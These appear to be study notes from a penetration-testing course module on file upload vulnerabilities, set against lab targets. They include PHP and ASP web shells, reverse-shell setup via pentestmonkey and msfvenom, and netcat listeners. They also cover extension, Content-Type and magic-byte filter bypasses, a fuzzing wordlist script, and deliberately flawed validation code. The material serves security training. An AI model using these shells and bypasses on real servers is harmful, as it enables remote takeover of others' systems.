| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass** |
| `shell.jpg.php` | Double Extension |
| `shell.php.jpg` | Reverse Double Extension |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character Injection - Before/After Extension |
| **Content/Type Bypass** |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of Web Content-Types |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |

## Limited Uploads

| **Potential Attack**   | **File Types** |
| --------------|-------------------|
| `XSS` | HTML, JS, SVG, GIF |
| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
| `DoS` | ZIP, JPG, PNG |

	> Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use.
	> However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application's back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it.
	> File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications, as we can see in the latest CVE Reports. We will also notice that most of these vulnerabilities are scored as High or Critical vulnerabilities, showing the level of risk caused by insecure file upload.

* Types of File Upload Attacks
	> The most common reason behind file upload vulnerabilities is weak file validation and verification, which may not be well secured to prevent unwanted file types or could be missing altogether. The worst possible kind of file upload vulnerability is an unauthenticated arbitrary file upload vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.
	> Many web developers employ various types of tests to validate the extension or content of the uploaded file. However, as we will see in this module, if these filters are not secure, we may be able to bypass them and still reach arbitrary file uploads to perform our attacks.
	> The most common and critical attack caused by arbitrary file uploads is gaining remote command execution over the back-end server by uploading a web shell or uploading a script that sends a reverse shell. A web shell, as we will discuss in the next section, allows us to execute any command we specify and can be turned into an interactive shell to enumerate the system easily and further exploit the network. It may also be possible to upload a script that sends a reverse shell to a listener on our machine and then interact with the remote server that way.
	> In some cases, we may not have arbitrary file uploads and may only be able to upload a specific file type. Even in these cases, there are various attacks we may be able to perform to exploit the file upload functionality if certain security protections were missing from the web application.

	> Examples of these attacks include:
    		- Introducing other vulnerabilities like XSS or XXE.
    		- Causing a Denial of Service (DoS) on the back-end server.
    		- Overwriting critical system files and configurations.
    		- And many others.

	> Finally, a file upload vulnerability is not only caused by writing insecure functions but is also often caused by the use of outdated libraries that may be vulnerable to these attacks. At the end of the module, we will go through various tips and practices to secure our web applications against the most common types of file upload attacks, in addition to further recommendations to prevent file upload vulnerabilities that we may miss.


[+] Absent validation
	> The most basic type of file upload vulnerability occurs when the web application does not have any form of validation filters on the uploaded files, allowing the upload of any file type by default.
	> With these types of vulnerable web apps, we may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell.

* Arbitrary File Upload
	> Let's start the exercise at the end of this section, and we will see an Employee File Manager web application, which allows us to upload personal files to the web application:
	> The web application does not mention anything about what file types are allowed, and we can drag and drop any file we want, and its name will appear on the upload form, including .php files:
	> Furthermore, if we click on the form to select a file, the file selector dialog does not specify any file type, as it says All Files for the file type, which may also suggest that no type of restrictions or limitations are specified for the web application:
	> All of this tells us that the program appears to have no file type restrictions on the front-end, and if no restrictions were specified on the back-end, we might be able to upload arbitrary file types to the back-end server to gain complete control over it.

* Identifying Web Framework
	> We need to upload a malicious script to test whether we can upload any file type to the back-end server and test whether we can use this to exploit the back-end server. Many kinds of scripts can help us exploit web applications through arbitrary file upload, most commonly a Web Shell script and a Reverse Shell script.
	> A Web Shell provides us with an easy method to interact with the back-end server by accepting shell commands and printing their output back to us within the web browser. A web shell has to be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-cross-platform scripts. So, the first step would be to identify what language runs the web application.
	> This is usually relatively simple, as we can often see the web page extension in the URLs, which may reveal the programming language that runs the web application. However, in certain web frameworks and web languages, Web Routes are used to map URLs to web pages, in which case the web page extension may not be shown. Furthermore, file upload exploitation would also be different, as our uploaded files may not be directly routable or accessible.
	> One easy method to determine what language runs the web application is to visit the /index.ext page, where we would swap out ext with various common web extensions, like php, asp, aspx, among others, to see whether any of them exist.
	> For example, when we visit our exercise below, we see its URL as http://SERVER_IP:PORT/, as the index page is usually hidden by default. But, if we try visiting http://SERVER_IP:PORT/index.php, we would get the same page, which means that this is indeed a PHP web application. We do not need to do this manually, of course, as we can use a tool like Burp Intruder for fuzzing the file extension using a Web Extensions(https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) wordlist, as we will see in upcoming sections. This method may not always be accurate, though, as the web application may not utilize index pages or may utilize more than one web extension.
	> Several other techniques may help identify the technologies running the web application, like using the Wappalyzer extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application:
	> As we can see, not only did the extension tell us that the web application runs on PHP, but it also identified the type and version of the web server, the back-end operating system, and other technologies in use. These extensions are essential in a web penetration tester's arsenal, though it is always better to know alternative manual methods to identify the web framework, like the earlier method we discussed.
	> We may also run web scanners to identify the web framework, like Burp/ZAP scanners or other Web Vulnerability Assessment tools. In the end, once we identify the language running the web application, we may upload a malicious script written in the same language to exploit the web application and gain remote control over the back-end server.

* Vulnerability Identification
	> Now that we have identified the web framework running the web application and its programming language, we can test whether we can upload a file with the same extension. As an initial test to identify whether we can upload arbitrary PHP files, let's create a basic Hello World script to test whether we can execute PHP code with our uploaded file.
	> To do so, we will write <?php echo "Hello HTB";?> to test.php, and try uploading it to the web application:
	> The file appears to have successfully been uploaded, as we get a message saying File successfully uploaded, which means that the web application has no file validation whatsoever on the back-end. Now, we can click the Download button, and the web application will take us to our uploaded file:
	> As we can see, the page prints our Hello HTB message, which means that the echo function was executed to print our string, and we successfully executed PHP code on the back-end server. If the page could not run PHP code, we would see our source code printed on the page.
	> In the next section, we will see how to exploit this vulnerability to execute code on the back-end server and take control over it.

[+] Upload Exploitation
	> The final step in exploiting this web application is to upload the malicious script in the same language as the web application, like a web shell or a reverse shell script. Once we upload our malicious script and visit its link, we should be able to interact with it to take control over the back-end server.

* Web Shells
	> We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option for PHP is phpbash(https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. Furthermore, SecLists(https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages, which can find in the /opt/useful/SecLists/Web-Shells directory in PwnBox.
	> We can download any of these web shells for the language of our web application (PHP in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let's try to upload phpbash.php from phpbash to our web application, and then navigate to its link by clicking on the Download button:
		http://SERVER_IP:PORT/uploads/phpbash.php
	> As we can see, this web shell provides a terminal-like experience, which makes it very easy to enumerate the back-end server for further exploitation. Try a few other web shells from SecLists, and see which ones best meet your needs.

* Writing Custom Web Shell
	> Although using web shells from online resources can provide a great experience, we should also know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed.
	> For example, with PHP web applications, we can use the system() function that executes system commands and prints their output, and pass it the cmd parameter with $_REQUEST['cmd'], as follows:
		Code: php
		<?php system($_REQUEST['cmd']); ?>
	> If we write the above script to shell.php and upload it to our web application, we can execute system commands with the ?cmd= GET parameter (e.g. ?cmd=id), as follows:
		http://SERVER_IP:PORT/uploads/shell.php?cmd=id

	> This may not be as easy to use as other web shells we can find online, but it still provides an interactive method for sending commands and retrieving their output. It could be the only available option during some web penetration tests.
	> Tip: If we are using this custom web shell in a browser, it may be best to use source-view by clicking [CTRL+U], as the source-view shows the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted.
	> Web shells are not exclusive to PHP, and the same applies to other web frameworks, with the only difference being the functions used to execute system commands. For .NET web applications, we can pass the cmd parameter with request('cmd') to the eval() function, and it should also execute the command specified in ?cmd= and print its output, as follows:
		Code: asp
		<% eval request('cmd') %>
	> We can find various other web shells online, many of which can be easily memorized for web penetration testing purposes. It must be noted that in certain cases, web shells may not work. This may be due to the web server preventing the use of some functions utilized by the web shell (e.g. system()), or due to a Web Application Firewall, among other reasons. In these cases, we may need to use advanced techniques to bypass these security mitigations, but this is outside the scope of this module.

* Reverse Shell
	> Finally, let's see how we can receive reverse shells through the vulnerable upload functionality. To do so, we should start by downloading a reverse shell script in the language of the web application. One reliable reverse shell for PHP is the pentestmonkey(https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell. Furthermore, the same SecLists(https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) we mentioned earlier also contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.
	> Let's download one of the above reverse shell scripts, like the pentestmonkey, and then open it in a text editor to input our IP and listening PORT, which the script will connect to. For the pentestmonkey script, we can modify lines 49 and 50 and input our machine's IP/PORT:
		Code: php
		$ip = 'OUR_IP';     // CHANGE THIS
		$port = OUR_PORT;   // CHANGE THIS
	> Next, we can start a netcat listener on our machine (with the above port), upload our script to the web application, and then visit its link to execute the script and get a reverse shell connection:
		m1l0js@htb[/htb]$ nc -lvnp OUR_PORT
	> As we can see, we successfully received a connection back from the back-end server that hosts the vulnerable web application, which allows us to interact with it for further exploitation. The same concept can be used for other web frameworks and languages, with the only difference being the reverse shell script we use.

* Generating Custom Reverse Shell Scripts
	> Just like web shells, we can also create our own reverse shell scripts. While it is possible to use the same previous system function and pass it a reverse shell command, this may not always be very reliable, as the command may fail for many reasons, just like any other reverse shell command.
	> This is why it is always better to use core web framework functions to connect to our machine. However, this may not be as easy to memorize as a web shell script. Luckily, tools like msfvenom can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do so as follows for PHP:
		m1l0js@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
	> Once our reverse.php script is generated, we can once again start a netcat listener on the port we specified above, upload the reverse.php script and visit its link, and we should receive a reverse shell as well:
		m1l0js@htb[/htb]$ nc -lvnp OUR_PORT
	> Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with the -p flag and specify the output language with the -f flag.
	> While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.


##Bypassing filters
[+] Client-Side validation
	> Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).
	> However, as the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. We may also modify the front-end code through our browser's dev tools to disable any validation in place.

* Client-Side Validation
	> The exercise at the end of this section shows a basic Profile Image functionality, frequently seen in web applications that utilize user profile features, like social media web applications:
	> However, this time, when we get the file selection dialog, we cannot see our PHP scripts (or it may be greyed out), as the dialog appears to be limited to image formats only:
	> We may still select the All Files option to select our PHP script anyway, but when we do so, we get an error message saying (Only images are allowed!), and the Upload button gets disabled:
	> This indicates some form of file type validation, so we cannot just upload a web shell through the upload form as we did in the previous section. Luckily, all validation appears to be happening on the front-end, as the page never refreshes or sends any HTTP requests after selecting our file. So, we should be able to have complete control over these client-side validations.
	> Any code that runs on the client-side is under our control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser. If the web application does not apply any of these validations on the back-end, we should be able to upload any file type.
	> As mentioned earlier, to bypass these protections, we can either modify the upload request to the back-end server, or we can manipulate the front-end code to disable these type validations.

* Back-end Request Modification
	> Let's start by examining a normal request through Burp. When we select an image, we see that it gets reflected as our profile image, and when we click on Upload, our profile image gets updated and persists through refreshes. This indicates that our image was uploaded to the server, which is now displaying it back to us:
	> If we capture the upload request with Burp, we see the following request being sent by the web application: => (https://academy.hackthebox.com/storage/modules/136/file_uploads_image_upload_request.jpg)
	> The web application appears to be sending a standard HTTP upload request to /upload.php. This way, we can now modify this request to meet our needs without having the front-end type validation restrictions. If the back-end server does not validate the uploaded file type, then we should theoretically be able to send any file type/content, and it would be uploaded to the server.
	> The two important parts in the request are filename="HTB.png" and the file content at the end of the request. If we modify the filename to shell.php and modify the content to the web shell we used in the previous section; we would be uploading a PHP web shell instead of an image.
	> So, let's capture another image upload request, and then modify it accordingly: => (https://academy.hackthebox.com/storage/modules/136/file_uploads_modified_upload_request.jpg)
	> Note: We may also modify the Content-Type of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.
	> As we can see, our upload request went through, and we got File successfully uploaded in the response. So, we may now visit our uploaded file and interact with it and gain remote code execution.

* Disabling Front-end Validation
	> Another method to bypass client-side validations is through manipulating the front-end code. As these functions are being completely processed within our web browser, we have complete control over them. So, we can modify these scripts or disable them entirely. Then, we may use the upload functionality to upload any file type without needing to utilize Burp to capture and modify our requests.
	> To start, we can click [CTRL+SHIFT+C] to toggle the browser's Page Inspector, and then click on the profile image, which is where we trigger the file selector for the upload form:
	> This will highlight the following HTML file input on line 18:
		Code: html
		<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
	> Here, we see that the file input specifies (.jpg,.jpeg,.png) as the allowed file types within the file selection dialog. However, we can easily modify this and select All Files as we did before, so it is unnecessary to change this part of the page.
	> The more interesting part is onchange="checkFile(this)", which appears to run a JavaScript code whenever we select a file, which appears to be doing the file type validation. To get the details of this function, we can go to the browser's Console by clicking [CTRL+SHIFT+K], and then we can type the function's name (checkFile) to get its details:
		Code: javascript
		function checkFile(File) {
		...SNIP...
		    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
		        $('#error_message').text("Only images are allowed!");
		        File.form.reset();
		        $("#submit").attr("disabled", true);
		    ...SNIP...
		    }
		}

	> The key thing we take from this function is where it checks whether the file extension is an image, and if it is not, it prints the error message we saw earlier (Only images are allowed!) and disables the Upload button. We can add PHP as one of the allowed extensions or modify the function to remove the extension check.
	> Luckily, we do not need to get into writing and modifying JavaScript code. We can remove this function from the HTML code since its primary use appears to be file type validation, and removing it should not break anything.
	> To do so, we can go back to our inspector, click on the profile image again, double-click on the function name (checkFile) on line 18, and delete it: => (https://academy.hackthebox.com/storage/modules/136/file_uploads_removed_js_function.jpg)
	> Tip: You may also do the same to remove accept=".jpg,.jpeg,.png", which should make selecting the PHP shell easier in the file selection dialog, though this is not mandatory, as mentioned earlier.
	> With the checkFile function removed from the file input, we should be able to select our PHP web shell through the file selection dialog and upload it normally with no validations, similar to what we did in the previous section.
	> Note: The modification we made to the source code is temporary and will not persist through page refreshes, as we are only changing it on the client-side. However, our only need is to bypass the client-side validation, so it should be enough for this purpose.
	> Once we upload our web shell using either of the above methods and then refresh the page, we can use the Page Inspector once more with [CTRL+SHIFT+C], click on the profile image, and we should see the URL of our uploaded web shell:
		Code: html
		<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
	> If we can click on the above link, we will get to our uploaded web shell, which we can interact with to execute commands on the back-end server: => (http://SERVER_IP:PORT/profile_images/shell.php?cmd=id)
	> Note: The steps shown apply to Firefox, as other browsers may have slightly different methods for applying local changes to the source, like the use of overrides in Chrome.

-=-===-=-
[+] Blacklist Filters
	> In the previous section, we saw an example of a web application that only applied type validation controls on the front-end (i.e., client-side), which made it trivial to bypass these controls. This is why it is always recommended to implement all security-related controls on the back-end server, where attackers cannot directly manipulate it.
	> Still, if the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.
	> The exercise we find in this section is similar to the one we saw in the previous section, but it has a blacklist of disallowed extensions to prevent uploading web scripts. We will see why using a blacklist of common extensions may not be enough to prevent arbitrary file uploads and discuss several methods to bypass it.

* Blacklisting Extensions
	> Let's start by trying one of the client-side bypasses we learned in the previous section to upload a PHP script to the back-end server. We'll intercept an image upload request with Burp, replace the file content and filename with our PHP script's, and forward the request:
	> As we can see, our attack did not succeed this time, as we got Extension not allowed. This indicates that the web application may have some form of file type validation on the back-end, in addition to the front-end validations.
	> There are generally two common forms of validating a file extension on the back-end:
    		- Testing against a blacklist of types
    		- Testing against a whitelist of types
	> Furthermore, the validation may also check the file type or the file content for type matching. The weakest form of validation amongst these is testing the file extension against a blacklist of extension to determine whether the upload request should be blocked. For example, the following piece of code checks if the uploaded file extension is PHP and drops the request if it is:
		Code: php
		$fileName = basename($_FILES["uploadFile"]["name"]);
		$extension = pathinfo($fileName, PATHINFO_EXTENSION);
		$blacklist = array('php', 'php7', 'phps');
		
		if (in_array($extension, $blacklist)) {
		    echo "File type not allowed";
		    die();
		}
	> The code is taking the file extension ($extension) from the uploaded file name ($fileName) and then comparing it against a list of blacklisted extensions ($blacklist). However, this validation method has a major flaw. It is not comprehensive, as many other extensions are not included in this list, which may still be used to execute PHP code on the back-end server if uploaded.
	> Tip: The comparison above is also case-sensitive, and is only considering lowercase extensions. In Windows Servers, file names are case insensitive, so we may try uploading a php with a mixed-case (e.g. pHp), which may bypass the blacklist as well, and should still execute as a PHP script.
	> So, let's try to exploit this weakness to bypass the blacklist and upload a PHP file.

* Fuzzing Extensions
	> As the web application seems to be testing the file extension, our first step is to fuzz the upload functionality with a list of potential extensions and see which of them return the previous error message. Any upload requests that do not return an error message, return a different message, or succeed in uploading the file, may indicate an allowed file extension.
	> There are many lists of extensions we can utilize in our fuzzing scan. PayloadsAllTheThings provides lists of extensions for PHP(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and .NET(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) web applications. We may also use SecLists list of common Web Extensions(https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).
	> We may use any of the above lists for our fuzzing scan. As we are testing a PHP application, we will download and use the above PHP list. Then, from Burp History, we can locate our last request to /upload.php, right-click on it, and select Send to Intruder. From the Positions tab, we can Clear any automatically set positions, and then select the .php extension in filename="HTB.php" and click the Add button to add it as a fuzzing position:
	> We'll keep the file content for this attack, as we are only interested in fuzzing file extensions. Finally, we can Load the PHP extensions list from above in the Payloads tab under Payload Options. We will also un-tick the URL Encoding option to avoid encoding the (.) before the file extension. Once this is done, we can click on Start Attack to start fuzzing for file extensions that are not blacklisted:
	> We can sort the results by Length, and we will see that all requests with the Content-Length (193) passed the extension validation, as they all responded with File successfully uploaded. In contrast, the rest responded with an error message saying Extension not allowed.

* Non-Blacklisted Extensions
	> Now, we can try uploading a file using any of the allowed extensions from above, and some of them may allow us to execute PHP code. Not all extensions will work with all web server configurations, so we may need to try several extensions to get one that successfully executes PHP code.
	> Let's use the .phtml extension, which PHP web servers often allow for code execution rights. We can right-click on its request in the Intruder results and select Send to Repeater. Now, all we have to do is repeat what we have done in the previous two sections by changing the file name to use the .phtml extension and changing the content to that of a PHP web shell:
	> As we can see, our file seems to have indeed been uploaded. The final step is to visit our upload file, which should be under the image upload directory (profile_images), as we saw in the previous section. Then, we can test executing a command, which should confirm that we successfully bypassed the blacklist and uploaded our web shell:
		http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id
-=-=-==
[+] Whitelist Filters
	> As discussed in the previous section, the other type of file extension validation is by utilizing a whitelist of allowed file extensions. A whitelist is generally more secure than a blacklist. The web server would only allow the specified extensions, and the list would not need to be comprehensive in covering uncommon extensions.
	> Still, there are different use cases for a blacklist and for a whitelist. A blacklist may be helpful in cases where the upload functionality needs to allow a wide variety of file types (e.g., File Manager), while a whitelist is usually only used with upload functionalities where only a few file types are allowed. Both may also be used in tandem.

* Whitelisting Extensions
	> Let's start the exercise at the end of this section and attempt to upload an uncommon PHP extension, like .phtml, and see if we are still able to upload it as we did in the previous section:
	> We see that we get a message saying Only images are allowed, which may be more common in web apps than seeing a blocked extension type. However, error messages do not always reflect which form of validation is being utilized, so let's try to fuzz for allowed extensions as we did in the previous section, using the same wordlist that we used previously:
	> We can see that all variations of PHP extensions are blocked (e.g. php5, php7, phtml). However, the wordlist we used also contained other 'malicious' extensions that were not blocked and were successfully uploaded. So, let's try to understand how we were able to upload these extensions and in which cases we may be able to utilize them to execute PHP code on the back-end server.
	> The following is an example of a file extension whitelist test:
		Code: php
		$fileName = basename($_FILES["uploadFile"]["name"]);
		
		if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
		    echo "Only images are allowed";
		    die();
		}

	> We see that the script uses a Regular Expression (regex) to test whether the filename contains any whitelisted image extensions. The issue here lies within the regex, as it only checks whether the file name contains the extension and not if it actually ends with it. Many developers make such mistakes due to a weak understanding of regex patterns.
	> So, let's see how we can bypass these tests to upload PHP scripts.

* Double Extensions
	> The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through Double Extensions. For example, if the .jpg extension was allowed, we can add it in our uploaded file name and still end our filename with .php (e.g. shell.jpg.php), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.
	> Exercise: Try to fuzz the upload form with This Wordlist(https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) to find what extensions are whitelisted by the upload form.
	> Let's intercept a normal upload request, and modify the file name to (shell.jpg.php), and modify its content to that of a web shell:
	> Now, if we visit the uploaded file and try to send a command, we can see that it does indeed successfully execute system commands, meaning that the file we uploaded is a fully working PHP script:
		filename="shell.jpg.php"
	> However, this may not always work, as some web applications may use a strict regex pattern, as mentioned earlier, like the following:
		Code: php
		if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
	> This pattern should only consider the final file extension, as it uses (^.*\.) to match everything up to the last (.), and then uses ($) at the end to only match extensions that end the file name. So, the above attack would not work. Nevertheless, some exploitation techniques may allow us to bypass this pattern, but most rely on misconfigurations or outdated systems.

* Reverse Double Extension
	> In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability. For example, an organization may use an open-source web application, which has a file upload functionality. Even if the file upload functionality uses a strict regex pattern that only matches the final extension in the file name, the organization may use the insecure configurations for the web server.
	> For example, the /etc/apache2/mods-enabled/php7.4.conf for the Apache2 web server may include the following configuration:
		Code: xml
		<FilesMatch ".+\.ph(ar|p|tml)">
		    SetHandler application/x-httpd-php
		</FilesMatch>

	> The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches .phar, .php, and .phtml. However, this regex pattern can have the same mistake we saw earlier if we forget to end it with ($). In such cases, any file that contains the above extensions will be allowed PHP code execution, even if it does not end with the PHP extension. For example, the file name (shell.php.jpg) should pass the earlier whitelist test as it ends with (.jpg), and it would be able to execute PHP code due to the above misconfiguration, as it contains (.php) in its name.
	> Exercise: The web application may still utilize a blacklist to deny requests containing PHP extensions. Try to fuzz the upload form with the PHP Wordlist to find what extensions are blacklisted by the upload form.
	> Let's try to intercept a normal image upload request, and use the above file name to pass the strict whitelist test:
		filename="shell.php.jpg"
	> Now, we can visit the uploaded file, and attempt to execute a command:
	> As we can see, we successfully bypassed the strict whitelist test and exploited the web server misconfiguration to execute PHP code and gain control over the server.

* Character Injection
	> Finally, let's discuss another method of bypassing a whitelist validation test through Character Injection. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.
	> The following are some of the characters we may try injecting:
    		%20
    		%0a
    		%00
    		%0d0a
    		/
    		.\
    		.
    		…
    		:

	> Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the (%00), and store it as (shell.php), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (:) before the allowed file extension (e.g. shell.aspx:.jpg), which should also write the file as (shell.aspx). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.
	> We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the PHP and JPG extensions, as follows:
		Code: bash
		
		for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
		    for ext in '.php' '.phps'; do
		        echo "shell$char$ext.jpg" >> wordlist.txt
		        echo "shell$ext$char.jpg" >> wordlist.txt
		        echo "shell.jpg$char$ext" >> wordlist.txt
		        echo "shell.jpg$ext$char" >> wordlist.txt
		    done
		done

	> With this custom wordlist, we can run a fuzzing scan with Burp Intruder, similar to the ones we did earlier. If either the back-end or the web server is outdated or has certain misconfigurations, some of the generated filenames may bypass the whitelist test and execute PHP code.
	> Exercise: Try to add more PHP extensions to the above script to generate more filename permutations, then fuzz the upload functionality with the generated wordlist to see which of the generated file names can be uploaded, and which may execute PHP code after being uploaded.

-=-=
[+] Type Filters
	> So far, we have only been dealing with type filters that only consider the file extension in the file name. However, as we saw in the previous section, we may still be able to gain control over the back-end server even with image extensions (e.g. shell.php.jpg). Furthermore, we may utilize some allowed extensions (e.g., SVG) to perform other attacks. All of this indicates that only testing the file extension is not enough to prevent file upload attacks.
	> This is why many modern web servers and web applications also test the content of the uploaded file to ensure it matches the specified type. While extension filters may accept several extensions, content filters usually specify a single category (e.g., images, videos, documents), which is why they do not typically use blacklists or whitelists. This is because web servers provide functions to check for the file content type, and it usually falls under a specific category.
	> There are two common methods for validating the file content: Content-Type Header or File Content. Let's see how we can identify each filter and how to bypass both of them.

* Content-Type
	> Let's start the exercise at the end of this section and attempt to upload a PHP script:
	> We see that we get a message saying Only images are allowed. The error message persists, and our file fails to upload even if we try some of the tricks we learned in the previous sections. If we change the file name to shell.jpg.phtml or shell.php.jpg, or even if we use shell.jpg with a web shell content, our upload will fail. As the file extension does not affect the error message, the web application must be testing the file content for type validation. As mentioned earlier, this can be either in the Content-Type Header or the File Content.
	> The following is an example of how a PHP web application tests the Content-Type header to validate the file type:
		Code: php
		
		$type = $_FILES['uploadFile']['type'];
		
		if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
		    echo "Only images are allowed";
		    die();
		}

	> The code sets the ($type) variable from the uploaded file's Content-Type header. Our browsers automatically set the Content-Type header when selecting a file through the file selector dialog, usually derived from the file extension. However, since our browsers set this, this operation is a client-side operation, and we can manipulate it to change the perceived file type and potentially bypass the type filter.
	> We may start by fuzzing the Content-Type header(https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) with SecLists' Content-Type Wordlist through Burp Intruder, to see which types are allowed. However, the message tells us that only images are allowed, so we can limit our scan to image types, which reduces the wordlist to 45 types only (compared to around 700 originally). We can do so as follows:
		m1l0js@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
		m1l0js@htb[/htb]$ cat content-type.txt | grep 'image/' > image-content-types.txt
	> Exercise: Try to run the above scan to find what Content-Types are allowed.
	> For the sake of simplicity, let's just pick an image type (e.g. image/jpg), then intercept our upload request and change the Content-Type header to it:
	> This time we get File successfully uploaded, and if we visit our file, we see that it was successfully uploaded:
		http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
	> Note: A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.

* MIME-Type
	> The second and more common type of file content validation is testing the uploaded file's MIME-Type. Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file through its general format and bytes structure.
	> This is usually done by inspecting the first few bytes of the file's content, which contain the File Signature(https://en.wikipedia.org/wiki/List_of_file_signatures) or Magic Bytes(https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). For example, if a file starts with (GIF87a or GIF89a), this indicates that it is a GIF image, while a file starting with plaintext is usually considered a Text file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.
	> Tip: Many other image types have non-printable bytes for their file signatures, while a GIF image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string GIF8 is common between both GIF signatures, it is usually enough to imitate a GIF image.
	> Let's take a basic example to demonstrate this. The file command on Unix systems finds the file type through the MIME type. If we create a basic file with text in it, it would be considered as a text file, as follows:
		m1l0js@htb[/htb]$ echo "this is a text file" > text.jpg 
		m1l0js@htb[/htb]$ file text.jpg 
		text.jpg: ASCII text
	> As we see, the file's MIME type is ASCII text, even though its extension is .jpg. However, if we write GIF8 to the beginning of the file, it will be considered as a GIF image instead, even though its extension is still .jpg:
		m1l0js@htb[/htb]$ echo "GIF8" > text.jpg 
		m1l0js@htb[/htb]$file text.jpg
		text.jpg: GIF image data

	> Web servers can also utilize this standard to determine file types, which is usually more accurate than testing the file extension. The following example shows how a PHP web application can test the MIME type of an uploaded file:
		Code: php
		
		$type = mime_content_type($_FILES['uploadFile']['tmp_name']);
		
		if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
		    echo "Only images are allowed";
		    die();
		}

	> As we can see, the MIME types are similar to the ones found in the Content-Type headers, but their source is different, as PHP uses the mime_content_type() function to get a file's MIME type. Let's try to repeat our last attack, but now with an exercise that tests both the Content-Type header and the MIME type:
	> Once we forward our request, we notice that we get the error message Only images are allowed. Now, let's try to add GIF8 before our PHP code to try to imitate a GIF image while keeping our file extension as .php, so it would execute PHP code regardless:
		GIF8
		<?php system($_REQUEST['cmd']); ?>
